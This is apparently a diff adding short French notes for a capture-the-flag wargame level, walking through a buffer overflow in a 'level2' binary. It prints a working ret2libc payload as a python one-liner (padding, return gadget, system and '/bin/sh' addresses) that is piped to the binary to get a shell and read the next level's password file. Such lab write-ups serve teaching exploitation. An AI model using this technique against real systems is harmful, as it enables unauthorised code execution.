@@ -1,0 +1,34 @@
+
+
+1. gdb level2 / disass main / disass p
+2. 
+2. exe recupere input sur l'entree standard, et SIG si l'input est trop grand, avec gdb on peut voir l'address du SIG et donc recuperer le padding necessaire
+3. input est protege, si l'address commence par b, ca exit. on place donc l'addresse du return en first.
+4. Ensuite on cherche l'addresse system sh -> "find &system, +99999999, "/bin/sh""
+5. Ensuite l'addresse system -> disas system -> first line
+6. python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'" > /tmp/level2
+									^					^				^			^
+								return				system			arg(dont care)	/bin/sh
+7. cat /tmp/level2 - | ./level2
+8. cat /home/user/level3/.pass
+
+
+<!-- 
+Ici on exploit une technique buffer overflow!
+L'exe recupere input sur l'entree standard, et SIG si l'input est trop grand, avec gdb on peut voir l'address du SIG et donc recuperer le padding necessaire.
+Ensuite deuxieme point, input est protege, si l'address commence par b, ca exit. on place donc l'addresse du return en first.
+Ensuite on cherche l'addresse system sh -> "find &system, +99999999, "/bin/sh""
+Ensuite l'addresse system -> disas system -> first line
+python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'" > /tmp/level2
+									^					^				^			^
+								return				system			arg(dont care)	/bin/sh
+
+Quite complicate to find :'(
+Get ur flag -->
+
+
+
+
+
+
+WHY 4 A ? 
